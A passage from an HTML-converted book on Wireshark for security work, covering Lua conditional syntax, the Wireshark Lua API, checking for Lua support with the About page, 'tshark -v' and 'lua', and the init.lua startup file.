<div class="Section328" ><p class=MsoNormal  style="margin-top:3.8000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >As you work through the statements, you see the code immediately after. To make it easier to create nested </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statements, you can combine an </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statement with the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >else </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >clause of the previous </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >statement into </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >elseif</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.9000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if (1==2) then -- this is false, so the elseif statement</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- will execute</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("second if is true") -- this is skipped since 1 does not</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >equal</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.1000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >elseif (1==1) then -- this will execute</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:37.2000pt;margin-left:8.0000pt;text-indent:14.3500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("elseif is true") -- this will output to the screen else</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:22.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print("everything is false")-- this will not execute since 1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:366.9500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- does equal 1 end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Wireshark API allows Lua scripts to access dissection data, introduce new dissectors, register post-dissectors, and save packet data to disk. The API is well documented in the Wireshark documentation. The general elements accessible by the API should be familiar if you have used Wireshark for some time or if you read </span><span><a href="#_bookmark532" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 7</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, as they are mostly made up of filter fields or display filters.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:17.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><a name="_bookmark616" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="Setup" ></a>Setup</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:10.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark embeds a Lua interpreter and exposes some of the C API through Lua. In the past, Lua came as a plug-in, but it is now</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >generally compiled directly by default. Given some installation options, however, it is possible to run Wireshark <a name="_bookmark617" ></a>without Lua. So before continuing with this chapter, check for Lua support in your installation of</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Wireshark.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.2000pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Checking for Lua Support</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:10.1500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The easiest way to check for Lua support is by reviewing the About page built in to Wireshark. To open it, click Help </span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:15.0000pt;" >&#8680;</span><span style="mso-spacerun:'yes';font-family:'MS UI Gothic';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.0500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >About Wireshark. The page should look something like<a name="_bookmark618" ></a>&nbsp;</span><span><a href="#_bookmark619" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-2</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. In the figure, the latest installation of Wireshark (latest as of writing this chapter) was 2.2.3, with Lua support for 5.2.4, even though the Lua binaries are</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section329" ><p class=MsoBodyText  style="margin-top:4.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >currently at 5.3.3.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="131.25"  height="0" ></td></tr><tr><td></td><td><img width="759"  height="653"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker411088.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark619" ></a><span><a href="#_bookmark618" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-2:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Wireshark About page</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The section to look out for starts with &#8220;Compiled&#8221; and continues listing libraries this installation was built with, prefixed by &#8220;with&#8221; or &#8220;without.&#8221; If your installation states &#8220;with Lua 5.x,&#8221; then you&#8217;re good to go. If your installation does not have Lua support built in, check the following sections on setting up Lua for your operating system.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The same check can be done with TShark. At the command line, you can verify you are able to run Lua scripts. Just type </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >TShark -v </span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >at the command line. You will see whether it supports Lua scripting. See an example output in the following code snippet.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark620" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ tshark -v</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section330" ><p class=MsoNormal  style="margin-top:4.0500pt;margin-right:72.9500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >TShark 1.10.2 (SVN Rev 51934 from /trunk-1.10) Copyright 1998-2013 Gerald Combs </span><span><a href="mailto:gerald@wireshark.org" ><u><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:12.0000pt;" >gerald@wireshark.org</span></u></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;color:rgb(0,0,255);font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >and contributors. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.3500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PURPOSE.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Compiled (32-bit) with GLib 2.32.4, with libpcap, with libz 1.2.7,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:7.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >with POSIX capabilities (Linux), without libnl, with SMI</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0.4.8, with c-ares 1.9.1, </span><b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-weight:bold;font-size:12.0000pt;" >with Lua 5.1</span></b><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >, without Python, with GnuTLS 2.12.20,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >with Gcrypt 1.5.0, with MIT Kerberos, with GeoIP.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:17.2500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Running on Linux 3.12-kali1-686-pae, with locale</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >en_US.UTF-8, with libpcap version 1.3.0, with libz 1.2.7.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Built using gcc 4.7.2.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Within the version output, you see Lua support: &#8220;&#8230;with Lua 5.1.&#8221;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Lastly, on a *nix machine, if you just type the command </span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >lua</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you will see the version number echoed back to you, as seen in the following code snippet:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.2500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >5.3.3</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Copyright (C) 1994-2016 Lua.org,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >PUC-Rio</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=17  style="margin-top:0.0000pt;margin-right:375.1500pt;margin-bottom:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;mso-list:l17 level1 lfo23;" ><![if !supportLists]><span style="font-family:'Courier New';font-size:12.0000pt;" ><span style='mso-list:Ignore;' >&#62;<span>&nbsp;</span></span></span><![endif]><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.5000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"test" test</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#62;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Lua Initialization</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.9000pt;margin-right:9.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now that you have verified Lua is working, you can dig into some more detail. The first Lua script executed by Wireshark is the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file located within the Wireshark </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >global </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >directory. If you are wondering where the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >global </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >directory is, it depends on your operating system. We go into more detail about this in a minute. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file helps to set up the Lua environment within Wireshark and handles things such as enabling and disabling Lua support. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file also attempts to provide some security checks for when Wireshark is running with elevated privileges on some operating systems. Again,</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >we delve into this with some more detail in a</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.6000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >bit.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:8.1000pt;margin-right:25.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Once the global </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua</span><span style="mso-spacerun:'yes';font-family:'Courier 